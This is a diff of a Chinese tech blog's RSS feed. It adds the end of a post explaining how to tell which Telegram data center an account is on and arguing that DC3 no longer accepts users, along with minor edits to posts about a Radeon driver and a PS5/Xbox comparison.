+<figure class="wp-block-image size-large"><a href="https://dev.moe/wp-content/uploads/2022/05/image-4.png"><img loading="lazy" width="1024" height="166" src="https://dev.moe/wp-content/uploads/2022/05/image-4-1024x166.png" alt="" class="wp-image-2576" srcset="https://dev.moe/wp-content/uploads/2022/05/image-4-1024x166.png 1024w, https://dev.moe/wp-content/uploads/2022/05/image-4-300x48.png 300w, https://dev.moe/wp-content/uploads/2022/05/image-4-768x124.png 768w, https://dev.moe/wp-content/uploads/2022/05/image-4-1536x248.png 1536w, https://dev.moe/wp-content/uploads/2022/05/image-4-1568x253.png 1568w, https://dev.moe/wp-content/uploads/2022/05/image-4.png 1720w" sizes="(max-width: 1024px) 100vw, 1024px" /></a></figure>
+
+
+
+<p>此时服务端会返回 <code>PHONE_MIGRATE_2</code> 错误，提示客户端应当要连接 DC2（如果连接 DC2 后进行同样操作，便会直接发送验证码）。</p>
+
+
+
+<p><strong>这样，我们就知道这个帐号是一个 DC2 的帐号。</strong>这种方法对于已注册的帐号同样有效，但是这种方法需要知道用户的手机号，难以用来查询群友的 DC。</p>
+
+
+
+<h3 id="方法-2-头像-文件法">方法 2（头像/文件法）</h3>
+
+
+
+<p>在刚才的 DC2 帐号注册完成后（下文称之为新号），我们利用会显示用户 DC 的第三方客户端（Plus Messenger），<strong>登录自己的另一个账号</strong>，去查看新号的 DC。然而，客户端此时并未能显示 DC，需要替新号上传头像后才显示新号在 DC2。</p>
+
+
+
+<div class="wp-block-image size-large"><figure class="aligncenter is-resized"><a href="https://dev.moe/wp-content/uploads/2022/05/image-5.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2022/05/image-5-1024x457.png" alt="" class="wp-image-2595" width="587" height="262" srcset="https://dev.moe/wp-content/uploads/2022/05/image-5-1024x457.png 1024w, https://dev.moe/wp-content/uploads/2022/05/image-5-300x134.png 300w, https://dev.moe/wp-content/uploads/2022/05/image-5-768x343.png 768w, https://dev.moe/wp-content/uploads/2022/05/image-5.png 1493w" sizes="(max-width: 587px) 100vw, 587px" /></a></figure></div>
+
+
+
+<p>这是因为第三方客户端是在下载用户头像时，通过 MTProto 协议 <a href="https://core.telegram.org/constructor/userProfilePhoto" target="_blank" rel="noreferrer noopener">userProfilePhoto</a> 结构体中的 <code>dc_id</code> 字段，来获知用户所在的 DC。</p>
+
+
+
+<div class="wp-block-image size-full"><figure class="aligncenter is-resized"><a href="https://dev.moe/wp-content/uploads/2022/05/image-6.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2022/05/image-6.png" alt="" class="wp-image-2597" width="567" height="247" srcset="https://dev.moe/wp-content/uploads/2022/05/image-6.png 871w, https://dev.moe/wp-content/uploads/2022/05/image-6-300x131.png 300w, https://dev.moe/wp-content/uploads/2022/05/image-6-768x335.png 768w" sizes="(max-width: 567px) 100vw, 567px" /></a></figure></div>
+
+
+
+<p><strong>这种方法是通过用户上传的文件所在的 DC，来判断用户所在的 DC。</strong></p>
+
+
+
+<blockquote class="wp-block-quote"><p>如果是用新号登录第三方客户端去查看自己的 DC，则可能是通过方法 1 判断出的 DC，因为客户端知道自己在连接哪个服务器。</p></blockquote>
+
+
+
+<h3 id="方法-3-web-cdn-法">方法 3（Web CDN 法）</h3>
+
+
+
+<p>最后我们通过上文提到的 bot 查询这个新号的 DC。</p>
+
+
+
+<div class="wp-block-image size-full"><figure class="aligncenter is-resized"><a href="https://dev.moe/wp-content/uploads/2022/05/image-7.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2022/05/image-7.png" alt="" class="wp-image-2598" width="454" height="204" srcset="https://dev.moe/wp-content/uploads/2022/05/image-7.png 739w, https://dev.moe/wp-content/uploads/2022/05/image-7-300x135.png 300w" sizes="(max-width: 454px) 100vw, 454px" /></a><figcaption>bot 说，该帐号所在的数据中心为 DC4（阿姆斯特丹，荷兰）</figcaption></figure></div>
+
+
+
+<p>咦？这个新号不是位于 DC2 吗，为什么 bot 会说是 DC4 呢？</p>
+
+
+
+<p>其实它是通过 Telegram Web CDN 来获取用户的 DC 的。我们打开 https://t.me/dctest** 查看源码，会发现新号的头像域名是以 cdn4 开头的，导致被 bot 判断为了 DC4。</p>
+
+
+
+<div class="wp-block-image size-large"><figure class="aligncenter is-resized"><a href="https://dev.moe/wp-content/uploads/2022/05/image-8.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2022/05/image-8-1024x334.png" alt="" class="wp-image-2599" width="532" height="173" srcset="https://dev.moe/wp-content/uploads/2022/05/image-8-1024x334.png 1024w, https://dev.moe/wp-content/uploads/2022/05/image-8-300x98.png 300w, https://dev.moe/wp-content/uploads/2022/05/image-8-768x251.png 768w, https://dev.moe/wp-content/uploads/2022/05/image-8.png 1164w" sizes="(max-width: 532px) 100vw, 532px" /></a></figure></div>
+
+
+
+<p><strong>由于 DC2 与 DC3 会「借用」同地点的 DC4 与 DC1 域名来提供 Web CDN 服务</strong>，因此 bot 无法找到任何 DC2 用户——他们都被判断成了 DC4 用户。</p>
+
+
+
+<blockquote class="wp-block-quote"><p>还有另一种 bot，要求用户给 bot 发送一个图片/文件来判断其 DC。这类似方法 2，可以较为准确的判断用户 DC。</p></blockquote>
+
+
+
+<h2 id="dc3-的消失">DC3 的消失</h2>
+
+
+
+<p>通过方法 2 正确获取用户 DC 后，我们可以发现在全球范围内（尤其是海外群组内），DC2 的用户并不算少，但 DC3 用户却屈指可数。多方查找后，我们发现了两名位于 DC3 的用户：<code>@urie**</code> 与 <code>@flowinglig**</code>。</p>
+
+
+
+<div class="wp-block-image size-large"><figure class="aligncenter is-resized"><a href="https://dev.moe/wp-content/uploads/2022/05/image-9.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2022/05/image-9-1024x642.png" alt="" class="wp-image-2621" width="552" height="346" srcset="https://dev.moe/wp-content/uploads/2022/05/image-9-1024x642.png 1024w, https://dev.moe/wp-content/uploads/2022/05/image-9-300x188.png 300w, https://dev.moe/wp-content/uploads/2022/05/image-9-768x481.png 768w, https://dev.moe/wp-content/uploads/2022/05/image-9.png 1492w" sizes="(max-width: 552px) 100vw, 552px" /></a></figure></div>
+
+
+
+<p>然而，如果进一步分析，就会发现他们可能并不是真的在 DC3。例如，调用 <a href="https://core.telegram.org/method/photos.getUserPhotos">photos.GetUserPhotos</a> 查看头像列表，可以看到 <code>@urie**</code> 上传过 7 张头像，其中只有两张位于 DC3，新上传的头像都已在 DC1。</p>
+
+
+
+<figure class="wp-block-image size-large"><a href="https://dev.moe/wp-content/uploads/2022/05/image-10.png"><img loading="lazy" width="1024" height="238" src="https://dev.moe/wp-content/uploads/2022/05/image-10-1024x238.png" alt="" class="wp-image-2622" srcset="https://dev.moe/wp-content/uploads/2022/05/image-10-1024x238.png 1024w, https://dev.moe/wp-content/uploads/2022/05/image-10-300x70.png 300w, https://dev.moe/wp-content/uploads/2022/05/image-10-768x179.png 768w, https://dev.moe/wp-content/uploads/2022/05/image-10-1536x357.png 1536w, https://dev.moe/wp-content/uploads/2022/05/image-10-1568x365.png 1568w, https://dev.moe/wp-content/uploads/2022/05/image-10.png 1603w" sizes="(max-width: 1024px) 100vw, 1024px" /></a></figure>
+
+
+
+<p>同样的，查看两位用户发言历史中的图片，也只有寥寥几张老图片是存于 DC3 的，新图片都是存在 DC1。而查看其它 DC 的用户，则发现他们发送的图片都存在各自所在的 DC 中。</p>
+
+
+
+<p>此外，<code>@urie**</code> 也在 2021 年发送过文件给 DC 识别机器人（文件法）进行测试，返回的结果同样是 DC1。</p>
+
+
+
+<div class="wp-block-image size-full"><figure class="aligncenter is-resized"><a href="https://dev.moe/wp-content/uploads/2022/05/image-12.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2022/05/image-12.png" alt="" class="wp-image-2624" width="513" height="251" srcset="https://dev.moe/wp-content/uploads/2022/05/image-12.png 982w, https://dev.moe/wp-content/uploads/2022/05/image-12-300x147.png 300w, https://dev.moe/wp-content/uploads/2022/05/image-12-768x377.png 768w" sizes="(max-width: 513px) 100vw, 513px" /></a></figure></div>
+
+
+
+<p>遗憾的是，由于无法获知他们的手机号，所以并不能通过方法 1（登录法）准确测试，这里只能通过方法 2（头像/文件法）推测他们从 DC3 被转移到了 DC1。</p>
+
+
+
+<p>为了进一步证实 DC3 已经不再接受新用户，我们生成了万余个全球各个地区的号码，通过方法 1（登录法）测试 Telegram 的 DC 分配规则，结果如下：</p>
+
+
+
+<div class="wp-block-image size-large"><figure class="aligncenter is-resized"><a href="https://dev.moe/wp-content/uploads/2022/05/image-14.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2022/05/image-14-1003x1024.png" alt="" class="wp-image-2637" width="716" height="731" srcset="https://dev.moe/wp-content/uploads/2022/05/image-14-1003x1024.png 1003w, https://dev.moe/wp-content/uploads/2022/05/image-14-294x300.png 294w, https://dev.moe/wp-content/uploads/2022/05/image-14-768x784.png 768w, https://dev.moe/wp-content/uploads/2022/05/image-14.png 1500w" sizes="(max-width: 716px) 100vw, 716px" /></a></figure></div>
+
+
+
+<blockquote class="wp-block-quote"><p>在测试过程中，我们尽可能让每个号码都连接到错误的 DC 上——这是为了通过返回的 <code>PHONE_MIGRATE_X</code> 错误了解号码对应的实际 DC，也是为了避免产生大量垃圾短信，造成骚扰及 <a href="https://en.wikipedia.org/wiki/Pavel_Durov" target="_blank" rel="noreferrer noopener">Pavel Durov</a> 因短信费破产。</p><p>在完成测试后，我们剔除了确定位于 DC4 的号码，再将剩余号码连接至 DC4 再次判断，以确保不会遗漏被分配至 DC3 的号码。</p></blockquote>
+
+
+
+<p>结合以上分析，我们可以认为 DC3 确实已不再接受新用户，而老用户也可能已经全部被转移至 DC1 了。</p>
+
+
+
+<p>尽管我们没能找到消失的 DC3，但如果你想要成为指定 DC 的用户，回避 DC5 的宕机风险，或是测试一下测试机器人是否靠谱，现在只需参考上一张图，使用特定国家代码的号码注册即可。</p>
+
+
+
+<hr class="wp-block-separator has-css-opacity"/>
+
+
+
+<p>由于 Telegram 服务端和部分运作机制并不开源，本文许多结论是通过推测得出。如有发现文中的错误，或有其他线索，欢迎评论提出。</p>
+
+
+
+<p>本文撰写过程中参考了以下项目及内容，在此表示感谢：</p>
+
+
+
+<ul><li><a href="https://blog.hertz.zone/2021-11-07_TGDC" target="_blank" rel="noreferrer noopener">Telegram DC 分析报告</a> by Hertz</li><li><a href="https://lab.best33.com/telegram-datacenter/" target="_blank" rel="noreferrer noopener">我的 Telegram 账号在哪个 DC ？</a>（Web CDN 法） by oott123</li><li><a href="https://github.com/gram-js/gramjs" target="_blank" rel="noreferrer noopener">GramJS</a></li><li>Plus Messenger（头像法）</li><li>@WooMaiBot（Web CDN 法）</li><li>@where_is_my_dc_bot（文件法）</li></ul>
+
+
+
+<p><strong>Coxxs</strong></p>
+
+
+
+<blockquote class="wp-block-quote"><p>本文（<a href="https://dev.moe/2564">https://dev.moe/2564</a>）由 Coxxs 原创，转载请注明原文链接。</p></blockquote>
+<p><a rel="nofollow" href="https://dev.moe/2564">Telegram DC 之都市传说</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://dev.moe/2564/feed</wfw:commentRss>
+			<slash:comments>6</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">2564</post-id>	</item>
+		<item>
 		<title>Surface Pro 8 体验优化</title>
 		<link>https://dev.moe/2507</link>
 					<comments>https://dev.moe/2507#comments</comments>
@@ -201,7 +857,7 @@
 ]]></content:encoded>
 					
 					<wfw:commentRss>https://dev.moe/2507/feed</wfw:commentRss>
-			<slash:comments>1</slash:comments>
+			<slash:comments>2</slash:comments>
 		
 		
 		<post-id xmlns="com-wordpress:feed-additions:1">2507</post-id>	</item>
@@ -285,10 +941,14 @@
 				<category><![CDATA[Random]]></category>
 		<guid isPermaLink="false">https://dev.moe/?p=2459</guid>
 
-					<description><![CDATA[<p>在 AMD 近些年风生水起后， 此前 Intel 和 AMD 合作推出的 i7-8809G 似乎就被双方忽略了<a class="more-link" href="https://dev.moe/2459">继续阅读<span class="screen-reader-text">"为 Radeon RX Vega M 安装新版驱动"</span></a></p>
+					<description><![CDATA[<p>更新：Intel 已恢复 Radeon RX Vega M 驱动的更新，可在这里下载。 在 AMD 近些年风生<a class="more-link" href="https://dev.moe/2459">继续阅读<span class="screen-reader-text">"为 Radeon RX Vega M 安装新版驱动"</span></a></p>
 <p><a rel="nofollow" href="https://dev.moe/2459">为 Radeon RX Vega M 安装新版驱动</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
 ]]></description>
 										<content:encoded><![CDATA[
+<p><strong>更新：</strong>Intel 已恢复 Radeon RX Vega M 驱动的更新，可在<a href="https://www.intel.com/content/www/us/en/download/19282/radeon-rx-vega-m-graphics.html" target="_blank" rel="noreferrer noopener">这里</a>下载。</p>
+
+
+
 <p>在 AMD 近些年风生水起后， 此前 Intel 和 AMD 合作推出的 i7-8809G 似乎就被双方忽略了。i7-8809G 融合了 Intel 的第 7 代 CPU 及 Radeon RX Vega M GPU，让电脑（NUC）在较小的体积下能够获得不错的性能。遗憾的是，推出仅 2 年后，AMD 就停止了 RX Vega M 的支持，驱动版本停留在了 20.2.2（2020 年 3 月）。</p>
 
 
@@ -313,7 +973,7 @@
 
 
 
-<h2>安装显卡驱动</h2>
+<h2 id="安装显卡驱动">安装显卡驱动</h2>
 
 
 
@@ -325,7 +985,7 @@
 
 
 
-<h2>安装音频输出驱动</h2>
+<h2 id="安装音频输出驱动">安装音频输出驱动</h2>
 
 
 
@@ -337,7 +997,7 @@
 
 
 
-<h2>安装 AMD Radeon Software 控制面板</h2>
+<h2 id="安装-amd-radeon-software-控制面板">安装 AMD Radeon Software 控制面板</h2>
 
 
 
@@ -387,9 +1047,8 @@
 <p>在“装一台高性能电脑”的梦想渐行渐远后，我拿着原先的预算入手了 PS5 及 Xbox Series X。在媒体的评测中，他们是本世代最强，都支持 HDMI 2.1 4K 120Hz，也都比上一代更安静。但在实际上手体验一阵子后，感受到两者除各有特色外，也各有一些问题。</p>
 
 
-
-<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-12.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-12-1024x570.png" alt="本世代最强 —— PS5 与 Xbox Series X" class="wp-image-2358" width="519" height="289" srcset="https://dev.moe/wp-content/uploads/2021/06/image-12-1024x570.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-12-300x167.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-12-768x427.png 768w, https://dev.moe/wp-content/uploads/2021/06/image-12-1536x855.png 1536w, https://dev.moe/wp-content/uploads/2021/06/image-12-1568x873.png 1568w, https://dev.moe/wp-content/uploads/2021/06/image-12.png 1689w" sizes="(max-width: 519px) 100vw, 519px" /></a><figcaption>PS5 / Xbox Series X</figcaption></figure></div>
-
+<div class="wp-block-image">
+<figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-12.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-12-1024x570.png" alt="本世代最强 —— PS5 与 Xbox Series X" class="wp-image-2358" width="519" height="289" srcset="https://dev.moe/wp-content/uploads/2021/06/image-12-1024x570.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-12-300x167.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-12-768x427.png 768w, https://dev.moe/wp-content/uploads/2021/06/image-12-1536x855.png 1536w, https://dev.moe/wp-content/uploads/2021/06/image-12-1568x873.png 1568w, https://dev.moe/wp-content/uploads/2021/06/image-12.png 1689w" sizes="(max-width: 519px) 100vw, 519px" /></a><figcaption>PS5 / Xbox Series X</figcaption></figure></div>
 
 
 <p>每位玩家更关注的地方都不尽相同，因此本文会从尽可能多的角度，比较两款机器的各个方面。阅读本文时，可仅阅读自己关注的部分。</p>
@@ -408,11 +1067,15 @@
 
 
 
+<p><strong>2022 年 3 月：</strong> Sony 已宣布 PS5 即将加入 VRR（可变帧率）支持。</p>
+
+
+
 <span id="more-2216"></span>
 
 
 
-<h2>噪音</h2>
+<h2 id="噪音">噪音</h2>
 
 
 
@@ -436,40 +1099,37 @@
 
 
 
-<figure class="wp-block-table is-style-stripes"><table><tbody><tr><td></td><td><strong>风扇</strong></td><td><strong>电源啸叫</strong></td><td><strong>评分</strong></td></tr><tr><td>PS4 Pro</td><td><img src="https://s.w.org/images/core/emoji/13.1.0/72x72/1f6e9.png" alt="🛩" class="wp-smiley" style="height: 1em; max-height: 1em;" /><img src="https://s.w.org/images/core/emoji/13.1.0/72x72/1f6e9.png" alt="🛩" class="wp-smiley" style="height: 1em; max-height: 1em;" /><img src="https://s.w.org/images/core/emoji/13.1.0/72x72/1f6e9.png" alt="🛩" class="wp-smiley" style="height: 1em; max-height: 1em;" /><br>（后期型号有改进）</td><td>抽奖，部分有啸叫<br>穿透力强</td><td>0/5</td></tr><tr><td>Xbox One X</td><td>风声</td><td>无感知</td><td>3/5</td></tr><tr><td>PS5</td><td>抽奖：<br>不悦噪音，穿透力强（Nidec）<br>微弱风声（Delta / NMB）</td><td>抽奖，部分有<a href="https://www.youtube.com/watch?v=2Kl7EshQPdM" target="_blank" rel="noreferrer noopener">电感啸叫</a><br>（渲染大型场景时）</td><td>2/5</td></tr><tr><td>Xbox Series X</td><td>无感知</td><td>无感知</td><td><strong>4.5/5</strong></td></tr></tbody></table></figure>
+<figure class="wp-block-table is-style-stripes"><table><tbody><tr><td></td><td><strong>风扇</strong></td><td><strong>电源啸叫</strong></td><td><strong>评分</strong></td></tr><tr><td>PS4 Pro</td><td><img src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f6e9.png" alt="🛩" class="wp-smiley" style="height: 1em; max-height: 1em;" /><img src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f6e9.png" alt="🛩" class="wp-smiley" style="height: 1em; max-height: 1em;" /><img src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f6e9.png" alt="🛩" class="wp-smiley" style="height: 1em; max-height: 1em;" /><br>（后期型号有改进）</td><td>抽奖，部分有啸叫<br>穿透力强</td><td>0/5</td></tr><tr><td>Xbox One X</td><td>风声</td><td>无感知</td><td>3/5</td></tr><tr><td>PS5</td><td>抽奖：<br>不悦噪音，穿透力强（Nidec）<br>微弱风声（Delta / NMB）</td><td>抽奖，部分有<a href="https://www.youtube.com/watch?v=2Kl7EshQPdM" target="_blank" rel="noreferrer noopener">电感啸叫</a><br>（渲染大型场景时）</td><td>2/5</td></tr><tr><td>Xbox Series X</td><td>无感知</td><td>无感知</td><td><strong>4.5/5</strong></td></tr></tbody></table></figure>
 
 
 
-<hr class="wp-block-separator"/>
+<hr class="wp-block-separator has-css-opacity"/>
 
 
-
-<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-3.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-3.png" alt="这台 Nidec 风扇的 PS5，运行时会发出 180Hz 与 1000Hz 的噪音" class="wp-image-2348" width="566" height="310" srcset="https://dev.moe/wp-content/uploads/2021/06/image-3.png 979w, https://dev.moe/wp-content/uploads/2021/06/image-3-300x164.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-3-768x420.png 768w" sizes="(max-width: 566px) 100vw, 566px" /></a><figcaption>这两条 180Hz 与 1000Hz 的线，将全程陪伴着 PS5 玩家 —— 如果抽中 Nidec 风扇的话</figcaption></figure></div>
-
+<div class="wp-block-image">
+<figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-3.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-3.png" alt="这台 Nidec 风扇的 PS5，运行时会发出 180Hz 与 1000Hz 的噪音" class="wp-image-2348" width="566" height="310" srcset="https://dev.moe/wp-content/uploads/2021/06/image-3.png 979w, https://dev.moe/wp-content/uploads/2021/06/image-3-300x164.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-3-768x420.png 768w" sizes="(max-width: 566px) 100vw, 566px" /></a><figcaption>这两条 180Hz 与 1000Hz 的线，将全程陪伴着 PS5 玩家 —— 如果抽中 Nidec 风扇的话</figcaption></figure></div>
 
 
 <p>由于 PS5 的风扇抽奖活动过于热烈，淘宝上卖 PS5 风扇的店家已经将价格从几十块涨到了接近￥400。好在更换 PS5 风扇操作简便，也无需戳破保修标签。如果不想抽奖，又很在意噪音，建议在问题解决前，避免购买 PS5。</p>
 
 
-
-<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-14.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-14-1024x694.png" alt="Microsoft 通过添加减震胶的方式，尽可能消除电源啸叫。这很简单粗暴，但也很有效。" class="wp-image-2360" width="544" height="368" srcset="https://dev.moe/wp-content/uploads/2021/06/image-14-1024x694.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-14-300x203.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-14-768x521.png 768w, https://dev.moe/wp-content/uploads/2021/06/image-14.png 1201w" sizes="(max-width: 544px) 100vw, 544px" /></a><figcaption>Xbox 电源内的减震胶，简单粗暴但有效 (<a href="https://www.youtube.com/watch?v=YG0U4I6dSR4&amp;t=392s" target="_blank" rel="noreferrer noopener">Source</a>)</figcaption></figure></div>
-
+<div class="wp-block-image">
+<figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-14.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-14-1024x694.png" alt="Microsoft 通过添加减震胶的方式，尽可能消除电源啸叫。这很简单粗暴，但也很有效。" class="wp-image-2360" width="544" height="368" srcset="https://dev.moe/wp-content/uploads/2021/06/image-14-1024x694.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-14-300x203.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-14-768x521.png 768w, https://dev.moe/wp-content/uploads/2021/06/image-14.png 1201w" sizes="(max-width: 544px) 100vw, 544px" /></a><figcaption>Xbox 电源内的减震胶，简单粗暴但有效 (<a href="https://www.youtube.com/watch?v=YG0U4I6dSR4&amp;t=392s" target="_blank" rel="noreferrer noopener">Source</a>)</figcaption></figure></div>
 
 
 <p><strong>Xbox Series X 则是近几年来最安静的游戏主机</strong>。从电源内部一坨坨的减震胶，也能看出 Microsoft 对噪音控制有多么重视。唯一的遗憾是光驱在播放蓝光电影时并不那么安静。</p>
 
 
 
-<h2>噪音（对他人）</h2>
+<h2 id="噪音-对他人">噪音（对他人）</h2>
 
 
 
 <p>很多时候，自己听起来舒爽的声音，对于身边的人却是一种噪音——如果想在学校寝室里玩，或者想在凌晨的家中游玩，就要考虑避免打扰身边的人。</p>
 
 
-
-<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-15.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-15-1024x572.png" alt="Xbox Series X 标配手柄与 PS5 DualSense 中，只有一款是减噪设计" class="wp-image-2361" width="399" height="222" srcset="https://dev.moe/wp-content/uploads/2021/06/image-15-1024x572.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-15-300x168.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-15-768x429.png 768w, https://dev.moe/wp-content/uploads/2021/06/image-15.png 1389w" sizes="(max-width: 399px) 100vw, 399px" /></a><figcaption>Xbox Series X 标配手柄与 PS5 DualSense 中，只有一款是减噪设计</figcaption></figure></div>
-
+<div class="wp-block-image">
+<figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-15.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-15-1024x572.png" alt="Xbox Series X 标配手柄与 PS5 DualSense 中，只有一款是减噪设计" class="wp-image-2361" width="399" height="222" srcset="https://dev.moe/wp-content/uploads/2021/06/image-15-1024x572.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-15-300x168.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-15-768x429.png 768w, https://dev.moe/wp-content/uploads/2021/06/image-15.png 1389w" sizes="(max-width: 399px) 100vw, 399px" /></a><figcaption>Xbox Series X 标配手柄与 PS5 DualSense 中，只有一款是减噪设计</figcaption></figure></div>
 
 
 <figure class="wp-block-table is-style-stripes"><table><tbody><tr><td></td><td><strong>标配手柄</strong></td><td><strong>耳机</strong></td><td><strong>评分</strong></td></tr><tr><td>PS5</td><td>有减噪设计，有一些声音</td><td>手柄可插有线耳机<br>主机只支持专用无线耳机<br>主机可插 USB 蓝牙声卡</td><td><strong>4/5</strong></td></tr><tr><td>Xbox Series X|S</td><td>无减噪设计，声音大</td><td>手柄可插有线耳机<br>主机只支持专用无线耳机<br>不支持第三方 USB 声卡 </td><td>1/5</td></tr></tbody></table></figure>
@@ -480,7 +1140,7 @@
 
 
 
-<hr class="wp-block-separator"/>
+<hr class="wp-block-separator has-css-opacity"/>
 
 
 
@@ -488,24 +1148,22 @@
 
 
 
-<h2>创新</h2>
+<h2 id="创新">创新</h2>
 
 
 
 <p>Sony 的创新一如既往，每代总有新东西。除了系统界面焕新外，PS5 的手柄 DualSense 在上一代手柄 DualShock 4 已有的触控板、陀螺仪的基础上，又增加了<strong>自适应扳机</strong>、<strong>麦克风</strong>（及静音按钮），并且强化了 3D 震动与手柄扬声器的音质。</p>
 
 
-
-<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-6.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-6-1024x576.png" alt="全新的 PS5 系统，遗憾的是并非全面的进步。PS4 系统的主题与自定义壁纸功能被取消。" class="wp-image-2352" width="512" height="288" srcset="https://dev.moe/wp-content/uploads/2021/06/image-6-1024x576.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-6-300x169.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-6-768x432.png 768w, https://dev.moe/wp-content/uploads/2021/06/image-6-1536x864.png 1536w, https://dev.moe/wp-content/uploads/2021/06/image-6-1568x882.png 1568w, https://dev.moe/wp-content/uploads/2021/06/image-6.png 1920w" sizes="(max-width: 512px) 100vw, 512px" /></a><figcaption>PS5 系统焕然一新，不过没了主题和自定义壁纸的功能</figcaption></figure></div>
-
+<div class="wp-block-image">
+<figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-6.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-6-1024x576.png" alt="全新的 PS5 系统，遗憾的是并非全面的进步。PS4 系统的主题与自定义壁纸功能被取消。" class="wp-image-2352" width="512" height="288" srcset="https://dev.moe/wp-content/uploads/2021/06/image-6-1024x576.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-6-300x169.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-6-768x432.png 768w, https://dev.moe/wp-content/uploads/2021/06/image-6-1536x864.png 1536w, https://dev.moe/wp-content/uploads/2021/06/image-6-1568x882.png 1568w, https://dev.moe/wp-content/uploads/2021/06/image-6.png 1920w" sizes="(max-width: 512px) 100vw, 512px" /></a><figcaption>PS5 系统焕然一新，不过没了主题和自定义壁纸的功能</figcaption></figure></div>
 
 
 <p><strong>这些机能在 PS5 自带的 Astro&#8217;s Playroom 游戏中发挥得淋漓尽致</strong>，让人上手惊呼“这才是次世代”。遗憾的是，在其他游戏中，这些机能用的并不多，也用得并不那么惊艳。好在手柄价格并未因此上涨太多，这些机能有总比没有好——<strong>在 PS5 的游戏中，我们可以期待会有更好的瞄准体验，以及更真实的震感、触感；在 PS5 的网战中，也可默认每位玩家都会有麦克风可用</strong>。</p>
 
 
-
-<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-4.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-4-1024x576.png" alt="按下 DualSense 手柄的扳机键，阻力会变。外加 3D 震动，让玩家感受到游戏的真实。" class="wp-image-2350" width="512" height="288" srcset="https://dev.moe/wp-content/uploads/2021/06/image-4-1024x576.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-4-300x169.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-4-768x432.png 768w, https://dev.moe/wp-content/uploads/2021/06/image-4-1536x864.png 1536w, https://dev.moe/wp-content/uploads/2021/06/image-4-1568x882.png 1568w, https://dev.moe/wp-content/uploads/2021/06/image-4.png 1920w" sizes="(max-width: 512px) 100vw, 512px" /></a><figcaption>阻力会变的自适应扳机与 3D 震动的结合 (Astro&#8217;s Playroom, PS5)</figcaption></figure></div>
-
+<div class="wp-block-image">
+<figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-4.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-4-1024x576.png" alt="按下 DualSense 手柄的扳机键，阻力会变。外加 3D 震动，让玩家感受到游戏的真实。" class="wp-image-2350" width="512" height="288" srcset="https://dev.moe/wp-content/uploads/2021/06/image-4-1024x576.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-4-300x169.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-4-768x432.png 768w, https://dev.moe/wp-content/uploads/2021/06/image-4-1536x864.png 1536w, https://dev.moe/wp-content/uploads/2021/06/image-4-1568x882.png 1568w, https://dev.moe/wp-content/uploads/2021/06/image-4.png 1920w" sizes="(max-width: 512px) 100vw, 512px" /></a><figcaption>阻力会变的自适应扳机与 3D 震动的结合 (Astro&#8217;s Playroom, PS5)</figcaption></figure></div>
 
 
